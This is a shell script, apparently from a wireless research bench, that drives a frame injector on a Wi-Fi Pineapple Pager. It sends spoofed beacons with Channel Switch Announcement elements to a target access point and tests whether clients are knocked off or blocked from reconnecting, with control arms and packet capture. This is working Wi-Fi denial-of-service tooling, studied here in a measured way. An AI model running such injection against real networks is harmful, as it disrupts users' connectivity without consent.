#!/bin/sh
# run_17a.sh -- day-one step 17a, run ON THE PAGER, one arm at a time.
#
# THE QUESTION. pineapd's CSA carries Channel Switch Count 0, and
# ieee80211_mgd_csa_present() discards a count-0 CSA before the auth/assoc refusal check, so
# pineapd's CSA can kick a client but can never deny it a reconnection. That reading is [A] --
# never measured on anything. This script is the measurement: same frame, same target, count 0
# against count 3.
#
# A SECOND, INDEPENDENT BLOCKER, found 2026-11-09: pineapd also hardcodes the New Channel Number to
# 14 (li a3,14 at 0x473634) -- 2484 MHz, Japan-only, 11b-only, absent from the US table -- so a
# client that DID honour pineapd's element would be told to move somewhere it may not go. pagerinj
# lets you name a legal channel, which is why <announce-chan> is mandatory here with no default.
#
# ⚠ WHY THIS NO LONGER STOPS PINEAPD BY DEFAULT -- measured on the bench 2026-11-09, four runs.
# dev/injector/README.md says to stop pineapd, because it hops the interface and its own CSA flood
# is a CSA-bearing clone source. An earlier revision of this script did that, and it cost three
# runs out of four: pineapd does not merely HOP wlan1mon, it OWNS it. After the first
# stop/start cycle the operator got
#     tcpdump: wlan0mon: That device is not up
#     WARNING: could not set freq
#     recv: Network is down          <- pagerinj transmitted NOTHING, rc=1
# on every subsequent run, and read the series as inconsistent client behaviour when in fact only
# the first run ever put a frame on the air. Stopping pineapd removes the very interfaces pagerinj
# needs.
# The channel-hop problem has a better answer that is already MEASURED: pineapd transmits fine
# under a held EXAMINE lock (CLAUDE.md "Third contact"), and EXAMINE pins the radio to the target's
# channel for us. So by default this script parks with EXAMINE and leaves pineapd alone.
# --stop-pineapd restores the old behaviour for the one case it is right for: when pineapd has
# recently been asked for a firmware CSA on this BSSID, so its own count-0 clones are in the air
# and pagerinj would skip them as clone sources. In that mode this script brings the interfaces
# back up itself, and WARNS BUT STILL FIRES if it cannot -- it does not refuse. (It did refuse until
# 2026-11-10; the refusal cost a bench run over a sysfs reading, and pagerinj's own rc plus the ==
# banner are the honest signal. See the HINT, NOT A VETO comment at the interface gate.)
#
# WHAT IT STILL DOES NOT DO. It does not tell you whether a frame reached the air. sendto()
# returning success proves nothing -- a cfg80211-blocked frame is freed and the path returns
# NETDEV_TX_OK. Only an external receiver settles that.
#
# ⚠ THE <watch-if> CAPTURE IS BLIND IN THE DEFAULT MODE -- measured 2026-11-10, three runs, each
# recording ZERO packets, including zero of the AP's own ~10/s beacons, which the filter would have
# caught. pineapd's cmdline carries "--interface wlan0mon --band wlan0mon:2", so it HOPS wlan0mon
# and the `iw dev wlan0mon set freq` below is overridden within a hop interval; EXAMINE parks only
# the PRIMARY interface. So an earlier version of this paragraph -- "on 2.4 GHz wlan0mon can watch
# while wlan1mon injects" -- is true only with --stop-pineapd, and the examples below did not pass
# it. Pass a watch-if if you like, but read the capture verdict at the end before believing it, and
# on 5 GHz it cannot work at all (radio0 is 2g, receive-only).
#
# Usage:
#   ./run_17a.sh <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if]
#                [--stop-pineapd] [--clone] [--count-dec] [--elem=<eid>:<hex>] [--mode=<n>]
#
#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0 wlan1mon --elem=32:00   # ⭐ RUN THIS FIRST
#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 8 3 wlan1mon --mode=1       # quiet, no move
#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3 wlan1mon --mode=0       # move, no quiet
#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3 wlan1mon --count-dec
#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0 wlan1mon --clone        # near-null, see below
#
# ⭐ PASS THE INJECT INTERFACE AS <watch-if>. It is the one EXAMINE parks, and client ToDS frames
# are measured to appear on it (CLAUDE.md "Second contact"). The old advice -- wlan0mon -- is
# measured BLIND, because pineapd hops it. Without a capture an arm produces an operator impression
# and nothing else, and the capture is what separates "the client had to auth/assoc its way back"
# from "it was quiesced and never left": two mechanisms, one frozen feed.
#
# ⚠ WHAT THE 2026-11-10 ADVERSARIAL PASS FOUND, because it changes which arm is worth running.
#
# --clone is a NEAR-TAUTOLOGICAL control on a mac80211 client, not the clean control it looks like.
# A verbatim clone has the same beacon_int, capability and filtered element set as the AP's own
# beacons, so it hashes to the same beacon_crc and is dropped by `goto free` at mlme.c:6929 --
# AHEAD of both ieee80211_rx_bss_info() (:6934) and ieee80211_sta_process_chanswitch() (:6936). It
# therefore separates "extra beacon frames" from "a CRC-relevant change", which is worth having,
# but NOT "the CSA element" from "any change to the beacon at all".
#
# --elem=<eid>:<hex> is the control that does. It appends one arbitrary element, so pick an id
# INSIDE mac80211's filter (7, 32, 42, 45, 60, 61 -- 32:00 is cleanest) and the frame is parsed
# without announcing any switch. A freeze under --elem=32:00 means the reaction is to the beacon
# changing, and every count result so far is about beacon churn. pagerinj warns if you pick an id
# outside the filter, because that arm would be another guaranteed null.
#
# --mode= separates the two things a CSA does, which no arm has yet separated. Channel Switch
# Mode 1 blocks the client's TX queues on the FIRST accepted beacon (mlme.c:2610), count-independently
# -- and a stalled uplink alone freezes a video stream. So:
#     --mode=1 with announce-chan == target-chan   quiet, nothing to move to
#     --mode=0 with announce-chan != target-chan   move announced, no transmit restriction
# If the quiet arm freezes and the move arm does not, the count byte was never in the causal path.
#
# --count-dec decrements 3,2,1 and repeats. It used to wrap through 0 and so transmitted count 0 on
# 23 of 92 frames -- including the last frame on the air -- which made that arm strictly contain the
# separate count-0 condition. Fixed 2026-11-10; it now floors at 1 and reports frames by count.
#
# Run the control FIRST, reconnect the client, then the count-3 arm. One arm per invocation on
# purpose: the thing being measured is a client's behaviour, and that needs you watching it.
# ALWAYS read the "frames left the radio" line at the end before believing anything you saw.

set -u

PAGERINJ="${PAGERINJ:-/root/pagerinj}"
# Overridable so iface_up can be exercised against a fixture tree off the device.
NET_SYS="${NET_SYS:-/sys/class/net}"

die() { printf '%s\n' "$*" >&2; exit 1; }

[ $# -ge 5 ] || die "usage: $0 <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if] [--stop-pineapd]"
IF="$1"; BSSID="$2"; TCHAN="$3"; ACHAN="$4"; COUNT="$5"
WIF=""; STOP_PINEAPD=0; CLONE=0; COUNT_DEC=0; ELEM=""; MODE=""
shift 5
# --elem and --mode take a value, and this loop has no lookahead, so they are spelled
# --elem=<eid>:<hex> and --mode=<n>. One less thing to get wrong than a positional pair.
for a in "$@"; do
  case "$a" in
    --elem=*)       ELEM="${a#--elem=}" ;;
    --mode=*)       MODE="${a#--mode=}" ;;
    --stop-pineapd) STOP_PINEAPD=1 ;;
    --clone)        CLONE=1 ;;
    --count-dec)    COUNT_DEC=1 ;;
    --elem|--mode)  die "$a takes a value: spell it $a=<value>" ;;
    -*) die "unknown option: $a" ;;
    *) WIF="$a" ;;
  esac
done
[ "$CLONE" = 1 ] && [ "$COUNT_DEC" = 1 ] && die "--clone and --count-dec are different arms: --clone sends no CSA element, so there is no count to decrement"
[ -n "$ELEM" ] && [ "$CLONE" = 1 ] && die "--clone and --elem= are different controls: --clone appends nothing, --elem appends one element"
[ -n "$ELEM" ] && [ "$COUNT_DEC" = 1 ] && die "--elem= sends no CSA element, so there is no count to decrement"
[ -n "$ELEM" ] && printf -- '!! --elem=%s: <announce-chan> %s and <count> %s are IGNORED -- this arm announces no switch\n' "$ELEM" "$ACHAN" "$COUNT" >&2
[ "$CLONE" = 1 ] && printf -- '!! --clone: <announce-chan> %s and <count> %s are IGNORED -- this arm sends no CSA element at all\n' "$ACHAN" "$COUNT" >&2

[ -x "$PAGERINJ" ] || die "no injector at $PAGERINJ (set PAGERINJ=/path to override)"
case "$BSSID" in
  [0-9A-Fa-f][0-9A-Fa-f]:*:*:*:*:[0-9A-Fa-f][0-9A-Fa-f]) ;;
  *) die "bssid does not look like a MAC: $BSSID" ;;
esac
[ "$TCHAN" -gt 0 ] 2>/dev/null || die "target-chan must be a positive number"
[ "$ACHAN" -gt 0 ] 2>/dev/null || die "announce-chan must be a positive number"
[ "$COUNT" -ge 0 ] 2>/dev/null || die "count must be 0 or more"
# Only the CSA arms announce a channel, and only mode 1 has a reason to name the SAME channel: it
# is the quiet-without-a-move arm, which is how you separate "the client obeyed the transmit
# restriction" from "the client actually switched". pagerinj still wants --allow-same-chan for it.
if [ "$CLONE" != 1 ] && [ -z "$ELEM" ] && [ "$TCHAN" = "$ACHAN" ]; then
  [ "$MODE" = 1 ] || die "announce-chan must differ from target-chan: a same-channel CSA announces no move. The one exception is the quiet-only arm, which needs --mode=1."
  printf -- '!! same-channel CSA with --mode=1: this is the QUIET-ONLY arm. It announces no move,\n' >&2
  printf -- '!! so anything the client does is the mode-1 transmit restriction and not a switch.\n' >&2
  SAME_CHAN_OK=1
fi
# EMPTY, not 0. ${VAR:+word} expands whenever VAR is non-empty, and the string "0" is non-empty --
# so defaulting this to 0 would have passed --allow-same-chan on EVERY CSA arm and silently
# defeated pagerinj's same-channel refusal, which exists because a same-channel mode-0 CSA is
# discarded outright by csa_present() (mlme.c:8379).
: "${SAME_CHAN_OK:=}"

# 2.4 GHz channel -> centre MHz. Only 1-14, the band where the Pager can both inject and watch.
mhz_for() {
  if [ "$1" -ge 1 ] 2>/dev/null && [ "$1" -le 13 ]; then
    echo $(( 2407 + 5 * $1 ))
  elif [ "$1" = 14 ]; then echo 2484
  else echo ""; fi
}
FREQ="${FREQ:-$(mhz_for "$TCHAN")}"
[ -n "$FREQ" ] || die "cannot map channel $TCHAN to a frequency; pass FREQ=<MHz> yourself"

# iface_up <if> -> 0 the kernel says it is UP, 1 the kernel says it is DOWN, 2 the kernel does not
# say (no such netdev, or sysfs unreadable). ONLY 1 is evidence of a problem.
#
# ⚠ READ THE RETRACTION BEFORE TRUSTING ANY REASONING HERE. An earlier version of this comment said
# the 2026-11-10 bench refusal happened because "a mac80211 monitor vif reads operstate down
# whatever its admin state", and that the interface had been "perfectly usable". The diagnostic the
# operator ran the same day refutes both:
#
#     run 1   flags 0x1102   operstate down      bit 0 CLEAR -> genuinely down
#     run 2   flags 0x1103   operstate unknown   bit 0 set   -> up
#
# So on THIS device an up monitor vif reports operstate `unknown` (which the old `up|unknown`
# whitelist accepted) and a `down` reading agrees with flags. wlan1mon was simply administratively
# down, with pineapd running (pid 11482) -- "pineapd is up" does not imply "its interfaces are up".
# The old ordering would have answered correctly on both readings; what actually cost the run was
# the die() at the gate below, not this ordering. The fixture the fix was built on was synthetic and
# tested its own hypothesis. Full retraction: dev/CamHound/AUDIT-2026-11-10.md, last section.
#
# flags-first is kept as HARDENING, not as the fix, and the reason is narrow and does not depend on
# the retracted claim: flags bit 0 IS IFF_UP, the administrative state, which is the thing this
# script wants to know, whereas operstate is a carrier notion that a driver need not maintain.
# Hex, e.g. 0x1003, so an odd last nibble means IFF_UP. The genuine defect the rewrite fixed is the
# third state: an ABSENT netdev used to return "down", a positive claim about something that is not
# there. (Whether the kernel calls netif_carrier_on for a monitor vif is NOT settled here -- an
# audit finder read net/mac80211/iface.c and says it does, which would predict `up` rather than the
# `unknown` this device reported. Unresolved, and deliberately not load-bearing for anything below.)
iface_up() {
  [ -d "$NET_SYS/$1" ] || return 2
  f=$(cat "$NET_SYS/$1/flags" 2>/dev/null) || f=""
  case "$f" in
    *[13579bdfBDF]) return 0 ;;
    *[02468aceACE]) return 1 ;;
    *) ;;                                # empty or not hex -- ask operstate instead
  esac
  case "$(cat "$NET_SYS/$1/operstate" 2>/dev/null)" in
    up|unknown) return 0 ;;
    down|lowerlayerdown) return 1 ;;
    *) return 2 ;;
  esac
}

# iface_down <if> -> true ONLY when the kernel positively says down. This is the right test at the
# pre-fire GATE, where the question is "should I warn?" and rc 2 is genuinely no news.
iface_down() { iface_up "$1"; [ $? = 1 ]; }

# iface_ready <if> -> true only when the kernel positively says UP. This is the right test for a
# recovery WAIT, where the question is "has it come back yet?" -- and there an absent netdev is not
# an unanswered question, it is the strongest possible NO.
#
# ⚠ The first revision used iface_down at both kinds of call site, and the 2026-11-10 audit caught
# it from four finder dimensions independently: because iface_down is false for rc 2, an absent
# interface made restore()'s 12 s settle loop exit on iteration 0 AND suppressed its
# "still down after 12s" warning -- in exactly the state the loop exists to wait out, since this
# script's own header says stopping pineapd "removes the very interfaces pagerinj needs". The old
# predicate waited the full 12 s and warned. One helper cannot serve both questions.
iface_ready() { iface_up "$1"; [ $? = 0 ]; }

bring_up() {
  ip link set "$1" up 2>/dev/null || ifconfig "$1" up 2>/dev/null || return 1
  sleep 1
  iface_ready "$1"
}

# cur_chan <if> -> the channel the radio is actually on, or empty. iw is in the measured device
# inventory; iwinfo is not, so there is no iwinfo arm here.
cur_chan() { iw dev "$1" info 2>/dev/null | sed -n 's/.*channel \([0-9]*\) .*/\1/p' | head -1; }

# examine_park -- ask pineapd to hold the radio, and SURFACE what it says.
# Both commands are hak5cmd symlinks, and hak5cmd exits 0 on every path including its error paths
# and writes the reason to stderr (measured 2026-11-05). The first revision sent both to
# >/dev/null 2>&1, which threw away the only signal that exists: a failed park was byte-for-byte
# indistinguishable from a successful one in this script's output.
examine_park() {
  _e=$(PINEAPPLE_EXAMINE_BSSID "$BSSID" "$LOCK" 2>&1 >/dev/null)
  [ -n "$_e" ] && printf -- '!! EXAMINE_BSSID said: %s\n' "$_e" >&2
  _e=$(PINEAPPLE_EXAMINE_CHANNEL "$TCHAN" "$LOCK" 2>&1 >/dev/null)
  [ -n "$_e" ] && printf -- '!! EXAMINE_CHANNEL said: %s\n' "$_e" >&2
  EXAMINED=1
  return 0
}

# park_check -- two channel read-backs, because an unparked radio is the one failure that produces a
# CONFIDENT wrong answer: pagerinj can still catch a target beacon during a hop pass, clone it, and
# report rc 0 while most of the burst went out on other channels. CamHound answers the same question
# the same way (lock_target's three cur_channel samples); this is the cut-down version.
park_check() {
  _a=$(cur_chan "$IF"); sleep 1; _b=$(cur_chan "$IF")
  if [ -z "$_a" ] || [ -z "$_b" ]; then
    printf -- '!! park UNVERIFIED: cannot read %s channel back. If the == line below says frames\n' "$IF" >&2
    printf -- '!! left the radio, they may have gone out across pineapd hop set, not on ch %s.\n' "$TCHAN" >&2
    return 2
  fi
  if [ "$_a" = "$TCHAN" ] && [ "$_b" = "$TCHAN" ]; then
    printf -- '-- park confirmed: %s reads ch %s twice\n' "$IF" "$TCHAN" >&2
    return 0
  fi
  printf -- '!! park FAILED: %s reads ch %s then ch %s, wanted %s. The radio is still hopping, so\n' "$IF" "$_a" "$_b" "$TCHAN" >&2
  printf -- '!! the burst will be sprayed across the hop set. Do not record an observation from\n' >&2
  printf -- '!! this run -- fix the park and fire again.\n' >&2
  return 1
}

PINEAPD_WAS_UP=0
pidof pineapd >/dev/null 2>&1 && PINEAPD_WAS_UP=1
CAP=""; CAPERR="/tmp/run17a_cap.err"; OUT=""
EXAMINED=0

restore() {
  [ -n "$CAP" ] && kill "$CAP" 2>/dev/null
  if [ "$EXAMINED" = 1 ]; then
    PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1
  fi
  if [ "$STOP_PINEAPD" = 1 ] && [ "$PINEAPD_WAS_UP" = 1 ]; then
    printf -- '-- restarting pineapd\n' >&2
    /etc/init.d/pineapd start >/dev/null 2>&1 \
      || printf 'WARNING: pineapd did not restart; start it by hand\n' >&2
    # It owns the monitor interfaces, so give it time to put them back before the operator's next
    # run walks into "That device is not up" -- which is exactly what happened on the bench.
    i=0
    while [ "$i" -lt 12 ]; do
      iface_ready "$IF" && break
      sleep 1; i=$(( i + 1 ))
    done
    iface_ready "$IF" || printf 'WARNING: %s is not up after 12s (iface_up rc %s). Wait, or reboot before re-running.\n' \
      "$IF" "$(iface_up "$IF"; echo $?)" >&2
  fi
  rm -f "$CAPERR" 2>/dev/null
}
# restore() does not exit, so trapping it on INT/TERM directly ran the handler and then CARRIED ON:
# Ctrl-C restarted pineapd, reset the EXAMINE lock, and the script went on to transmit into a radio
# that was no longer parked. Exiting FROM the signal handler fires the EXIT trap, so restore still
# runs, exactly once, and the run actually stops. 130/143 are the conventional SIGINT/SIGTERM codes.
# HUP and QUIT matter as much as INT here, and were missing until the 2026-11-10 audit: the
# documented workflow is ssh, and closing the terminal or dropping the link delivers SIGHUP to the
# foreground process group. Untrapped, the shell dies WITHOUT running the EXIT trap, so on the
# --stop-pineapd path a dropped connection left pineapd stopped, the EXAMINE lock unreleased and the
# backgrounded tcpdump alive -- the precise state this script's header says cost three bench runs.
trap restore EXIT
trap 'exit 130' INT
trap 'exit 143' TERM
trap 'exit 129' HUP
trap 'exit 131' QUIT

printf -- '-- target %s ch %s (%s MHz); announcing ch %s with count %s on %s\n' \
  "$BSSID" "$TCHAN" "$FREQ" "$ACHAN" "$COUNT" "$IF" >&2

# EXAMINE pins the radio to the target's channel without taking the interfaces away, and pineapd is
# measured to transmit under a held lock. The lock must outlast the whole episode.
LOCK=$(( 10 + 10 + 10 ))

if [ "$STOP_PINEAPD" = 1 ]; then
  if [ "$PINEAPD_WAS_UP" = 1 ]; then
    printf -- '-- stopping pineapd (--stop-pineapd given)\n' >&2
    /etc/init.d/pineapd stop >/dev/null 2>&1
    sleep 2
  fi
  # pineapd OWNS these interfaces; stopping it takes them down. Measured on the bench.
  for i in "$IF" ${WIF:+$WIF}; do
    iface_ready "$i" || { printf -- '-- %s is not up after the pineapd stop; bringing it up\n' "$i" >&2; bring_up "$i" || true; }
  done
elif [ "$PINEAPD_WAS_UP" = 0 ]; then
  printf -- '!! pineapd is NOT running, so EXAMINE cannot park the radio and %s may not even\n' "$IF" >&2
  printf -- '!! exist -- pineapd creates and owns the monitor interfaces. Start it (open the web\n' >&2
  printf -- '!! UI, or /etc/init.d/pineapd start) and re-run.\n' >&2
fi

# ⚠ THIS IS A HINT, NOT A VETO, and the first revision got that wrong too. It called die() here,
# and on the bench it aborted a run outright over a sysfs reading that was itself wrong (see
# iface_up) -- converting "fire and report honestly" into "fire nothing", which is the worse
# failure of the two. The thing this check was added to prevent is the operator mistaking a
# non-transmitting run for a client observation, and the == banner at the end already prevents it
# from pagerinj's own rc, which is ground truth. So: warn, try to help, fire anyway.
iface_up "$IF"; ifrc=$?
if [ "$ifrc" = 1 ]; then
  printf -- '!! %s reads DOWN (flags=%s operstate=%s). Trying to bring it up.\n' "$IF" \
    "$(cat "$NET_SYS/$IF/flags" 2>/dev/null || echo '?')" \
    "$(cat "$NET_SYS/$IF/operstate" 2>/dev/null || echo '?')" >&2
  bring_up "$IF" || true
  iface_down "$IF" && printf -- '!! %s is STILL down. Firing anyway: if the == line below says\n!! NOTHING WAS TRANSMITTED, this is why -- pineapd owns the monitor interfaces, so check\n!! `pidof pineapd` before blaming the radio.\n' "$IF" >&2
elif [ "$ifrc" = 2 ]; then
  printf -- '!! cannot tell whether %s is up: no %s/%s. Firing anyway; the == line below is the\n!! only thing that settles whether a frame was transmitted.\n' "$IF" "$NET_SYS" "$IF" >&2
fi

# ⚠ THE PARK GOES HERE, AFTER the interface repair -- it used to go before it. The EXAMINE branch
# asked pineapd to hold a radio and THEN changed the administrative state of that very vif with
# `ip link set up`, without re-parking or re-checking; the --stop-pineapd branch already sequenced
# it the other way round, which is what made the asymmetry visible to the 2026-11-10 audit. Parking
# last also means the 30 s lock covers more of the fire rather than being spent on sleeps.
if [ "$STOP_PINEAPD" = 1 ]; then
  printf -- '-- parking %s on %s MHz\n' "$IF" "$FREQ" >&2
  iw dev "$IF" set freq "$FREQ" 20 2>/dev/null \
    || printf 'WARNING: could not set freq on %s; pagerinj uses whatever is there\n' "$IF" >&2
  park_check || true
elif [ "$PINEAPD_WAS_UP" = 1 ]; then
  printf -- '-- parking with EXAMINE for %ss (pineapd owns %s, so it is left running)\n' "$LOCK" "$IF" >&2
  examine_park
  sleep 2
  park_check || true
else
  # No park was issued and none could be. Saying so is the whole point: the first revision printed
  # "parking with EXAMINE for 30s (pineapd left running)" unconditionally, one line after warning
  # that pineapd was NOT running -- five finder dimensions reported that contradiction, and the
  # false line was the one printed last and in the informational style.
  printf -- '!! NOT PARKED: no EXAMINE was issued, so the radio is wherever it happens to be.\n' >&2
fi

if [ -z "$WIF" ]; then
  printf -- '!! no <watch-if> given, so NO capture will run and this arm produces an operator\n' >&2
  printf -- '!! impression and nothing else. The capture is what separates "the client had to\n' >&2
  printf -- '!! auth/assoc its way back" from "it was quiesced by mode 1 and never left" -- the\n' >&2
  printf -- '!! two mechanisms that both look like a frozen feed. Pass %s as the watch-if: it is\n' "$IF" >&2
  printf -- '!! the interface EXAMINE parks, and client ToDS frames are measured to appear on it.\n' >&2
fi
if [ -n "$WIF" ]; then
  mkdir -p /root/loot 2>/dev/null
  iface_ready "$WIF" || { printf -- '-- %s is not up; bringing it up\n' "$WIF" >&2; bring_up "$WIF" || true; }
  iw dev "$WIF" set freq "$FREQ" 20 2>/dev/null
  if [ "$CLONE" = 1 ]; then ARM=clone
  elif [ "$COUNT_DEC" = 1 ]; then ARM="c${COUNT}dec"
  else ARM="c${COUNT}"; fi
  OUT="/root/loot/csa_17a_${ARM}_$(date +%s 2>/dev/null || echo now).pcap"
  # ⚠ THE FILTER USED TO BE `wlan addr2 <bssid>` ALONE, WHICH COULD NOT SEE THE CLIENT -- and the
  # client is the entire subject of 17a. addr2 is the transmitter, so that form shows our clones,
  # the AP's own beacons and 17c's action frames, and nothing the station ever sends. Adding
  # `wlan addr1 <bssid>` picks up the client's ToDS data AND its auth/assoc requests (addr1 is the
  # AP for both), plus the AP's responses. That pair is what distinguishes "the client was
  # disconnected and had to auth/assoc its way back" from "the client was merely quiesced by
  # Channel Switch Mode 1 and never left" -- the two mechanisms that produce an identical frozen
  # feed. Found by the 2026-11-10 adversarial pass.
  #
  # An earlier revision used `(type mgt and subtype beacon or subtype action) and wlan addr2 ...`
  # and `subtype action` is NOT in pcap-filter's mgt subtype list, so the filter never compiled.
  # -U so records reach the file as they arrive: WITHOUT it tcpdump buffers, and the previous
  # revision's "is the file >= 24 bytes yet" arm test called a perfectly healthy capture dead while
  # tcpdump was printing its own "listening on ..." banner. The sound test is whether the PROCESS
  # is alive -- which is what CamHound's capture_bss does, and what this now copies.
  : >"$CAPERR"
  tcpdump -i "$WIF" -nn -e -s 0 -U -w "$OUT" "wlan addr1 $BSSID or wlan addr2 $BSSID" >/dev/null 2>"$CAPERR" &
  CAP=$!
  sleep 2
  if kill -0 "$CAP" 2>/dev/null; then
    printf -- '-- capturing on %s -> %s\n' "$WIF" "$OUT" >&2
  else
    printf -- '!! capture died on %s. tcpdump said:\n' "$WIF" >&2
    sed -n '1,6p' "$CAPERR" >&2 2>/dev/null
    printf -- '!! re-check the filter with:  tcpdump -d wlan addr1 %s or wlan addr2 %s\n' "$BSSID" "$BSSID" >&2
    CAP=""; OUT=""
  fi
fi

printf -- '-- firing\n' >&2
# Three explicit branches rather than one line with a conditionally-expanded flag: an unquoted
# ${VAR:+--flag} is the shape that silently word-splits, and this is the line that decides what
# goes on the air.
if [ "$CLONE" = 1 ]; then
  "$PAGERINJ" -i "$IF" --clone --bssid "$BSSID" --secs 10
elif [ -n "$ELEM" ]; then
  "$PAGERINJ" -i "$IF" --elem "$ELEM" --bssid "$BSSID" --secs 10
elif [ "$COUNT_DEC" = 1 ]; then
  "$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --count-dec --secs 10 \
    ${MODE:+--mode "$MODE"} ${SAME_CHAN_OK:+--allow-same-chan}
else
  "$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --secs 10 \
    ${MODE:+--mode "$MODE"} ${SAME_CHAN_OK:+--allow-same-chan}
fi
RC=$?

if [ -n "$CAP" ]; then
  # ⚠ Re-check liveness. The only previous check was `kill -0` at t+2, and the fire does not start
  # until t+4 at the earliest -- so the whole transmit window lay OUTSIDE the period that check
  # covered, and a tcpdump that died at t+5 still produced the healthy "capture: ... (N bytes)" line
  # plus the read-the-CSA-element invitation. pineapd owning and retuning the monitor interfaces is
  # a concrete mechanism for exactly that death.
  if kill -0 "$CAP" 2>/dev/null; then capalive=1; else capalive=0; fi
  sleep 1; kill "$CAP" 2>/dev/null; wait "$CAP" 2>/dev/null; CAP=""
  if [ "$capalive" = 0 ]; then
    printf -- '!! the capture DIED before the fire finished, so it did not record the transmit\n' >&2
    printf -- '!! window and nothing in the file is evidence either way. tcpdump said:\n' >&2
    sed -n '1,6p' "$CAPERR" >&2 2>/dev/null
  elif [ -s "$CAPERR" ]; then
    # tcpdump prints its own "N packets captured" summary to stderr on SIGTERM, and that count is a
    # better total than the file size. The first revision binned it and then deleted the file.
    printf -- '-- tcpdump reported:\n' >&2
    sed -n '1,6p' "$CAPERR" >&2 2>/dev/null
  fi
  # ⚠ NOT [ -s "$OUT" ]. A libpcap file header is 24 bytes and every record adds at least a
  # 16-byte record header, so `-s` is true for a capture containing ZERO packets -- and on
  # 2026-11-10 it was, three runs in a row: the script printed "capture: ... (24 bytes)" and then
  # cheerfully offered "read the CSA element with:" for a file with nothing in it. That is the
  # exact mislead this script exists to prevent, committed by the script itself.
  CAPB=$(wc -c <"$OUT" 2>/dev/null | tr -d ' ')
  [ -n "$CAPB" ] || CAPB=0
  if [ "$CAPB" -gt 24 ]; then
    printf -- '-- capture: %s (%s bytes)\n' "$OUT" "$CAPB" >&2
    # ⚠ tcpdump does NOT decode element 37. A beacon with the CSA appended prints identically to one
    # without, at every -v level (verified against a fixture pcap, tcpdump 4.99.4), so the hint this
    # line used to give -- 'grep -i switch' -- found nothing and read as "no CSA was sent". Count the
    # raw element bytes instead: 25 03 01 is {eid 37, len 3, mode 1}. The clone length is constant
    # within a run, so the hex alignment is too, and the count comes back as either about sent= or 0.
    printf -- '-- tcpdump cannot decode element 37, so grep for its bytes instead:\n' >&2
    printf -- '--   tcpdump -r %s -nn -x type mgt subtype beacon | grep -c 2503     (mode 1; ~sent= or 0)\n' "$OUT" >&2
    printf -- '--   0 can mean odd alignment: retry with 0301, but that also matches a DS element\n' >&2
    # The caveat belongs on THIS branch too. `CAPB > 24` is satisfied by ONE recorded frame of any
    # kind, and the filter matches the AP's own beacons as well as our clones -- so a hopping
    # receiver's most likely output is a few of the AP's beacons and none of our burst, which lands
    # here and reads as healthy. Finding nothing when you grep for `switch` is then uninformative,
    # and the branch below says so at length while this one used to say nothing.
    # Only when the watch interface is NOT the parked one. EXAMINE parks the PRIMARY, so passing
    # the inject interface as watch-if gives a capture that is held on the target channel -- and
    # printing "pineapd HOPS wlan1mon" over 2600 captured packets on the parked primary is simply
    # false. pineapd hops the interfaces it was NOT asked to park.
    if [ "$STOP_PINEAPD" != 1 ] && [ "$WIF" != "$IF" ]; then
      printf -- '!! but pineapd HOPS %s in this mode, so a short capture is most likely the AP own\n' "$WIF" >&2
      printf -- '!! beacons caught between hops, NOT our burst. No channel-switch element here is\n' >&2
      printf -- '!! weak evidence of anything. An external receiver is the only frame-level proof.\n' >&2
    fi
  elif [ "$CAPB" = 24 ]; then
    printf -- '!! capture recorded ZERO packets (%s is a %s-byte pcap header and nothing else).\n' "$OUT" "$CAPB" >&2
    printf -- '!! Nothing in it is evidence, and the filter is probably innocent: it would have\n' >&2
    printf -- '!! caught the AP own beacons too, and it caught none. The likely cause is that\n' >&2
    printf -- '!! pineapd HOPS %s -- its cmdline carries "--interface %s --band %s:2" -- so the\n' "$WIF" "$WIF" "$WIF" >&2
    printf -- '!! "iw dev %s set freq" above is overridden within a hop interval. EXAMINE parks\n' "$WIF" >&2
    printf -- '!! only the PRIMARY interface (%s). Use an external receiver for frame-level proof.\n' "$IF" >&2
  else
    printf -- '!! capture file is empty: nothing was recorded, so nothing here is evidence\n' >&2
  fi
fi

# The headline, last, because it is the thing that decides whether the observation means anything.
if [ "$RC" = 0 ]; then
  printf -- '== FRAMES LEFT THE RADIO (pagerinj rc=0). sendto success is not proof of transmission,\n' >&2
  printf -- '== but rc!=0 IS proof of the opposite. Now: did the client drop, and can it re-associate?\n' >&2
else
  printf -- '== NOTHING WAS TRANSMITTED (pagerinj rc=%s). Whatever you just saw was not caused by this\n' "$RC" >&2
  printf -- '== run. Fix the error above and fire again before recording any observation.\n' >&2
fi
exit "$RC"
